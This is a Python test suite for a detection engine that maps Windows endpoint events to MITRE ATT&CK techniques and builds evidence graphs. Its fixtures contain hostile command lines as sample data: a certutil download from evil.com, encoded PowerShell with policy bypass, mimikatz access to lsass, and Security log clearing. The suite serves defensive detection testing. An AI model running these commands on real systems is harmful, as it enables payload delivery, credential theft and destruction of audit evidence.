"""
SentinelTwin - Automated Test Suite for MITRE ATT&CK Engine & Evidence Graphs
"""
import pytest
from backend.services.mitre_mapping import MitreMapper
from backend.services.evidence_graph import EvidenceGraphEngine


def test_1_normal_powershell_no_match():
    event = {
        "event_type": "1",
        "details": {
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Get-Date"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is None


def test_2_powershell_suspicious_t1059_001():
    event = {
        "event_type": "1",
        "details": {
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1059.001"
    assert match["tactic"] == "Execution"


def test_3_cmd_lotl_t1059_003():
    event = {
        "event_type": "1",
        "details": {
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1059.003"


def test_4_lsass_dump_t1003_001():
    event = {
        "event_type": "10",
        "details": {
            "process_name": "mimikatz.exe",
            "target_process": r"C:\Windows\System32\lsass.exe",
            "granted_access": "0x1010"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1003.001"
    assert match["tactic"] == "Credential Access"


def test_5_service_creation_t1543_003():
    event = {
        "event_type": "1",
        "details": {
            "process_name": "sc.exe",
            "command_line": "sc create MaliciousService binpath= C:\\temp\\svc.exe"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1543.003"


def test_6_log_clearing_t1070_001():
    event = {
        "event_type": "1102",
        "details": {
            "process_name": "wevtutil.exe",
            "command_line": "wevtutil cl Security"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1070.001"
    assert match["tactic"] == "Defense Evasion"


def test_7_port_scan_sequence_t1046():
    history = [{"dest_ip": "10.107.4.1", "dest_port": p} for p in [21, 22, 80, 443, 445, 3389]]
    event = {"event_type": "3", "details": {"process_name": "scanner.exe"}}
    match = MitreMapper.evaluate(event, recent_connection_history=history)
    assert match is not None
    assert match["technique_id"] == "T1046"
    assert match["tactic"] == "Discovery"


def test_8_system_info_t1082():
    event = {
        "event_type": "1",
        "details": {
            "process_name": "systeminfo.exe",
            "command_line": "systeminfo.exe /fo csv"
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1082"


def test_9_exfiltration_anomaly_t1041():
    event = {
        "event_type": "3",
        "details": {
            "process_name": "data_agent.exe",
            "outbound_bytes": 12_000_000,
            "destination_port": 4444
        }
    }
    match = MitreMapper.evaluate(event)
    assert match is not None
    assert match["technique_id"] == "T1041"
    assert match["tactic"] == "Exfiltration"


def test_10_evidence_graph_reproducibility():
    mitre_data = {
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "tactic": "Execution",
        "matched_rule": "Suspicious PowerShell Invocations",
        "reason": "Encoded command argument observed"
    }

    graph = EvidenceGraphEngine.generate_graph(
        alert_id="alt-001",
        alert_title="High Risk: PowerShell",
        risk_score=85.0,
        device_id="10.107.4.78",
        user_id="Administrator",
        contributing_events=[{
            "id": "evt-100",
            "event_type": "1",
            "source": "Sysmon",
            "timestamp": "2026-08-31T12:00:00Z",
            "details": {"command_line": "powershell -enc ..."}
        }],
        behavioral_mutations=["Off-Hours Activity Deviation"],
        mitre_data=mitre_data
    )

    types = {n["type"] for n in graph["nodes"]}
    assert "entity" in types
    assert "event" in types
    assert "mutation" in types
    assert "mitre" in types
    assert "risk" in types
    assert "alert" in types
    assert len(graph["edges"]) >= 5